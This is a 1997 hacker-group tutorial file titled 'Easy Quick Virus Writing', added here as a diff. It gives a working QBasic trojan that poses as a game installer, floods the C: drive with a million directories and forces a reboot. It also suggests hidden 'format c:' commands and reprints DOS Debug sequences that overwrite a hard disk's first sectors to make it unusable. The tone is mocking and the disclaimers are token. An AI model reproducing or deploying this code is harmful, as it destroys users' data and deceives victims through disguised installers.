@@ -1,0 +1,261 @@
+*************************************
+*       PISS PHILEZ NUMBER 4        *
+*                                   *
+*      Easy Quick Virus Writing     *
+*                                   *
+*          by Defenestrator         *
+*************************************
+
+WARNING:  This file is for information only.  If you use it in any 
+harmful manner then me, my friends, PISS, and anyone I know cannot 
+be held responsible.
+
+OVERVIEW
+--------
+
+Today, viruses seem to be portrayed as anything which harms computers.  
+There are many types of files like this, like trojan horses, logic bombs, 
+real viruses, worms, etc.  But all these dumbass people think all of 
+these are viruses.  If you do, you're a fuckin idiot and should read more.  
+If you know these then skip this section.
+
+Trojan Horse- a file hidden inside another seemingly okay file which does 
+stuff the masking program doesn't do.  The name is derived from Greek
+mythology, when during the Iliad the Trojans gave their enemies a big
+damn horse as a gift, but armies were hidden inside.  Just a little
+insight for ya.
+
+Logic Bombs- program which has a certain condition which must be met 
+before the program starts- like the Michaelangelo virus of a few years 
+back.  It would only start on March 6, Michaelangelo's birthday, and
+would wipe the hard drive.  However, smart people figured just set the
+date wrong and skip the 6th.  
+
+Viruses- program which reproduces itself onto several machines, 
+attaching on to files to procreate.
+
+Worms- program which spreads from machine to machine using one machine 
+as a host (not used a lot)
+
+EASY WRITING
+----------
+
+To truly write a simple trojan horse, use the simplest programming 
+language.  I either use batch programming or QBasic.  I also know 
+someone who does cooll stuff in DOS Debug.  All are absurdly easy to 
+write and evade the scanners with.  
+
+BATCH PROGRAMMING
+-----------------
+
+Batch programming, for those of you who are newbies or just stupid, is 
+taking MS-DOS batch commands and sticking them in a file which can be 
+run on its own.  
+
+If you don't know MS-DOS commands, I'm NOT GONNA TEACH YOU CUZ YOU'RE 
+STUPID!  I use Linux and Win95 but still know all the DOS commands.  
+Just remember, before anything you write, put [@echo off] so that the 
+person getting this doesn't know what's going on.
+
+QBASIC stuff
+------------
+
+QBasic is a REAL simple programming language, so if you want to learn 
+to program this is always a starting place.  I learned how to use the 
+old BASIC in like 3rd grade, which was like 10 years ago.  Most of the 
+commands are still almost the same.  And best of all, this program is 
+either free or comes with your computer (on Win95 you gotta go get it).  
+But it's not like I paid for any other program lately either, so to me 
+everything's free!
+
+How can we use this to do cool things?
+
+Like this:
+This is an example of a trojan horse I wrote which poses as an install 
+program for a game.  The "game" is made more realistic by zipping it 
+and adding bogus *.dat files which make it look like it's actually a 
+real program.
+
+Here goes:
+
+REM bitch by Defenestrator
+COLOR 14, 0
+PRINT "Are you in DOS?"
+INPUT x$
+IF x$ = "yes" THEN GOTO 1 ELSE GOTO 2
+1 PRINT "Installing datafiles..please wait..."
+PRINT "This may take up to 20 minutes.."
+SHELL "cd\"
+FOR a = 1 TO 1000000
+a$ = STR$(a)
+c$ = "md" + a$ + ".hee"
+SHELL c$
+NEXT a
+CLS
+PRINT "P.I.S.S. 1.0 is now installed on your system"
+PRINT "Have a shitty day!"
+PRINT "Press Enter to reboot your system!"
+OUT &H64, &HFE
+END
+2 PRINT "Go to DOS before running P.I.S.S. 1.0"
+END
+
+Let's take this SIMPLE program apart.
+
+This simple trojan horse poses as an installer, but instead makes 1 
+million directories from the c:\ drive which cannot be deleted without 
+being a real pain in the ass with Norton commander, or just 
+reformatting the hard drive.  
+
+The shell "<DOS command>" runs a DOS command without showing it, which 
+is good if you want to be real easy and do shell "format c:\".
+
+It's also a good idea to get a compiler for QBasic because the code can 
+be read by any text file viewer, which is the only major drawback of 
+QBasic.  That and it can't draw worth shit.
+
+So if you want to learn more QBasic, e-mail me, look in the help files, 
+or keyword search on altavista.
+
+DOS DEBUG
+---------
+I don't know a lot of debug, so I'm gonna reprint an article in a mail 
+list I subscribe to.  This article is courtesy of w0rmh0le.  
+
+Disclaimer: I am not responsible for any damage following the guidelines
+of this text may incur on your system. These commands can be dangerous
+if used incorrectly. I am not responsible for any damage of your life,
+liberty, and all that good stuff, blah, blah as a result of the misuse
+of any materials herein. Proceed with extreme caution. Have a nice day.
+
+Dos Debug which is distributed with every version of Windows 95 has some
+interesting commands which I think many people have overlooked. In this
+post I will show you some very powerful things you can do with this
+tiny, harmless little program....
+Please note that commands are not case sensitive and I have used
+capitals in most cases for clarification.
+
+To start debug, go get the dos command prompt (whichever way you
+prefer). You should get a hyphen "-" prompt.  You can type "?" followed
+by return at this time to get a list of all (documented) commands. All
+commands are followed by returns btw. Anyway, the commands we are
+interested in are L (load), W (write), and F (fill),  I'll explain load
+first.
+        NOTE: All values must be in hexadecimal. It sounds confusing at
+first, but it's really not once you know what you are doing.
+
+To use load, one usually does something like this:
+-N foo.com
+-L 100
+
+This tells the computer the name of the program you are working on, and
+where to load it into memory. However, we are going to use a more arcane
+method, which is called the absolute read. (voice echoes)
+
+An absolute read simply allows you to read byte space straight off of
+any disk on your computer. You do this by first typing "L" at the
+hyphen, followed by the address in memory you want it loaded into,
+followed by a number specifying the drive number ( 0 = A:, 1 = B:, 2 =
+C:, etc. ) followed by the sector address to begin reading at followed
+by the amount of bytes to read. Easy, no? Hehe.
+
+Ex.
+L 0 0 0 25
+This loads 25h bytes from the first sector of the floppy disk in A: into
+memory starting at offset 0h in the current segment. Note that a max of
+80h bytes can be read at one time.
+
+The write command is almost exactly the same as the read command, so it
+doesn't require much explanation now except that it does the opposite of
+the load command.
+
+Ex.
+W 0 0 0 25
+This writes 25h bytes to A: from 0h in memory to the first sector of the
+disk.
+
+To use fill, type "F" followed by the memory address you want to start
+filling at, followed by an "L", followed by how many bytes to fill and
+finally the byte you want to fill with.  The "L" does not mean load, but
+rather length.
+
+Ex.
+F 100 L 25 FF
+This would fill 25h bytes starting at 100h in memory with the byte value
+FF which, by the way, is basically meaningless.
+
+Now for the fun part. If you understand all of the above, either you are
+very persistant, or you know something of how disks really work.
+Bringing it all together is the key here. I will first show you an
+attack which can take less than a minute to do. My comments are followed
+by the semicolons.
+
+C:\>debug
+-F 0 L 80 00    ;fill an area of memory with 00h null bytes.
+-W 0 2 0 80     ;write to the drive.
+-Q                    ;quit
+
+This attack has just rendered the hard disk unusable in less than a
+minutes time. I recommend IF YOU KNOW WHAT YOU ARE DOING to try this out
+on a floppy disk. It will be rendered unusable. The commands follow:
+
+C:\>debug
+-F 0 L 80 00
+-W 0 0 0 80     ;take note of the second zero PLEASE.
+-Q
+
+Ok, Im done with the malicious stuff, onto some fun. I have found out
+that volume labels in dos start at the 27th byte of any hard or floppy
+disk. Check this out:
+
+-L 0 0 0 80  ;change the second zero to whatever if you want.
+-E 27 xx xx xx xx    ;where the xx's are the new label in bytes. You
+have to insert your label backwards in pairs of two.
+-W 0 0 0 80     ;write to floppy.
+-Q                     ;quit
+
+The "E" commands enters our bytes into memory.
+
+Phun ex.
+-L 0 0 0 80
+-E 27 66 06 00 00  ;Figure this one out on your own...
+-W 0 0 0 80
+-Q
+
+There are numerous other things you can play with too, so get some debug
+docs, or e-mail me for one I found. Have phun!
+
+<-----a production of----->
+             \/\/0rmH0Le
+    w0rmh0le@hotmail.com
+"Internet security is an oxymoron"
+
+----------------------------------------------------------------------
+PISS - People into Serious Shit
+
+Founderz - Defenestrator, PhrostByte
+Memberz - 
+Author Parselon
+Wu Forever
+kQs
+CGibbons
+Extinction
+Faekon/Homarid
+Grench
+Greenseed
+Tim 121
+Rhodekyll
+
+Contributors- 
+Sameer Ketkar
+
+Want more stuff?  Go to http://www.angelfire.com/sc/PISS/philez.html
+The site will change as soon as I get money for one..
+
+E-mail the group at davematthews@rocketmail.com
+
+©1997 PISS Publications
+This file may be posted freely as long as this notice stays on the file.
+All rights reserved.
+
+
